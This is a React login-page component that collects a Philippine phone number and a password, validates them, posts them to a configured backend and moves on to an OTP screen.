import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import logo from "../assets/logo.jpeg";
import "../styles/home.css";

const countryCodes = [
  { code: "+63", country: "Philippines" },
];

// Validation schema
const schema = yup.object().shape({
  phone: yup.string().required("Phone number is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [selectedCountryCode, setSelectedCountryCode] = useState(
    countryCodes[0].code
  );
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

 const submitForm = (data) => {
  setLoading(true);

  // Remove the first '0' if it exists in the user's number
  let userPhoneNumber = data.phone;
  if (userPhoneNumber.startsWith("0")) {
    userPhoneNumber = userPhoneNumber.substring(1);
  }

  // Combine the country code with the phone number
  const fullPhoneNumber = `${selectedCountryCode}${userPhoneNumber}`;

  // Save phone number to local storage
  localStorage.setItem("userPhoneNumber", fullPhoneNumber);

  axios
    .post(`${BASE_URL}/`, { ...data, phone: fullPhoneNumber })
    .then((response) => {
      console.log(response.data);
      navigate("/otp");
    })
    .catch((error) => {
      console.error("There was an error!", error);
    })
    .finally(() => {
      setLoading(false);
    });
};

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="home-container">
      {/* Logo */}
      <img src={logo} alt="logo" className="logo" />

      <form onSubmit={handleSubmit(submitForm)} className="form-wrapper">
        {/* Phone Number Input */}
        <div className="form-group">
          <label htmlFor="phone" className="form-label">
            Phone number
          </label>
          <div className="input-container">
            <select
              className="country-code-select"
              value={selectedCountryCode}
              onChange={(e) => setSelectedCountryCode(e.target.value)}
            >
              {countryCodes.map((country) => (
                <option key={country.code} value={country.code}>
                 {country.code}
                </option>
              ))}
            </select>
            <input
              name="phone"
              type="tel"
              placeholder="Phone number"
              required
              className="form-input"
              {...register("phone")}
            />
          </div>
          <FormErrMsg errors={errors} inputName="phone" />
        </div>

        {/* Password Input */}
        <div className="form-group">
          <label htmlFor="password" className="form-label">
            Password
          </label>
          <div className="input-container">
            <input
              name="password"
              type={showPassword ? "text" : "password"}
              placeholder="Enter password"
              required
              className="form-input"
              {...register("password")}
            />
            <div
              onClick={togglePasswordVisibility}
              className="password-toggle-icon"
            >
              {showPassword ? <FaEyeSlash /> : <FaEye />}
            </div>
          </div>
          <FormErrMsg errors={errors} inputName="password" />
        </div>

        {/* Forgot Password */}
        <div className="forgot-password">
          <a href="#" className="forgot-password-link">
            Forgot your password?
          </a>
        </div>

        {/* Submit Button */}
        <button type="submit" className="submit-button" disabled={loading}>
          {loading ? "Loading..." : "Log in"}
        </button>
      </form>
    </div>
  );
};

export default Home;